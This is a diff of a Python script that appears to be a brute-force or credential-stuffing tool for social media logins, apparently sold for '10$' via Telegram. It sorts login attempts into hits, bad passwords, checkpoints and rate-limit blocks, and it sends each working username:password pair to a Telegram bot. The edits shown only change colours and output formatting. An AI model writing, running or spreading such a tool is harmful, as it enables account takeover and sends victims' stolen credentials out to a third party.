@@ -28,14 +28,15 @@ logo = l+"""
 888   d88P d88P Y88b  888   Y8888 
 8888888P" d88P   Y88b 888    Y888                                         
 =======================================
-  Author   : TLYAK
+ \033[1;97m 
+Author   : TLYAK
   Tlegram Chanal : Team_Coder1
   Telegram : lililliilliil
   Note : 10$
      ============BNX============ 
 =======================================
 """
-tele = input("\033[33;1mAmaday Y/n: ")
+tele = input("\033[37;1mAmaday Y/n: ")
 os.system('clear')
 if "Y" in tele:
     id = input("\033[37;1mID TELEGRAM: ")
@@ -87,22 +88,22 @@ if xoshnaw == "1":
             if "Y" or "y" in tele:
                 t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=GOOD: {user}:{pasw}")
             h += 1
-            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT: {s}",end='')
+            print(f"\r \033[32mHackbw:{h} \033[31;1mBad:{b} \033[33;1mCHIKPOINT:",end='')
         elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
             b += 1
-            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT: {s}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT:",end='')
         elif 'challenge_required' or 'two' in log.text:
             s += 1
-            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT: {s}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT:",end='')
         elif 'Please wait a few minutes' in log.text:
             block += 1
-            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT: {s}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT:",end='')
         elif 'Bad request' in log.text:
             b += 1
-            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT: {s}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT:",end='')
         else:
             b+=1    
-            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT: {s}",end='')
+            print(f"\r \033[32mHackbw: {h} \033[31;1mBad: {b} \033[33;1mCHIKPOINT:",end='')
 
 elif xoshnaw =="2":
     os.system('clear')
